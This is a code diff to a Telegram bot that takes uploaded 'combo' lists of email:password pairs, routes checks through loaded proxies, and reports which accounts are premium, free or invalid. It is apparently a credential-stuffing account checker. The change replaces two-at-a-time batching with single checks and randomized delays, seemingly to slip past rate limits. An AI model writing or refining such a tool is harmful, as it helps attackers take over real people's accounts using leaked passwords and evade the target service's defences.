@@ -235,7 +235,7 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking - Very safe small batches (2 at a time)
+    # Combo checking - Very safe (1 at a time)
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
@@ -263,27 +263,25 @@ async def handle(message: types.Message):
     total = len(lines)
     await message.answer(f"🚀 Checking {total} combos... (fast mode)")
 
-    for i in range(0, total, 2):   # Only 2 at a time to prevent freezing
-        batch = lines[i:i+2]
-        for line in batch:
-            try:
-                email, password = line.split(":", 1)
-                result = checker.check(email.strip(), password.strip())
+    for line in lines:
+        try:
+            email, password = line.split(":", 1)
+            result = checker.check(email.strip(), password.strip())
 
-                stats['checked'] += 1
-                if result['status'] == 'PREMIUM':
-                    stats['premium'] += 1
-                elif result['status'] == 'FREE':
-                    stats['free'] += 1
-                else:
-                    stats['invalid'] += 1
+            stats['checked'] += 1
+            if result['status'] == 'PREMIUM':
+                stats['premium'] += 1
+            elif result['status'] == 'FREE':
+                stats['free'] += 1
+            else:
+                stats['invalid'] += 1
 
-                await send_result(message.from_user.id, result)
+            await send_result(message.from_user.id, result)
 
-            except:
-                continue
+            await asyncio.sleep(2.0 + random.uniform(0.3, 0.8))  # Safe delay
 
-        await asyncio.sleep(1.8)  # Safe delay between small batches
+        except:
+            continue
 
     await message.answer("✅ Finished checking all combos!")
 
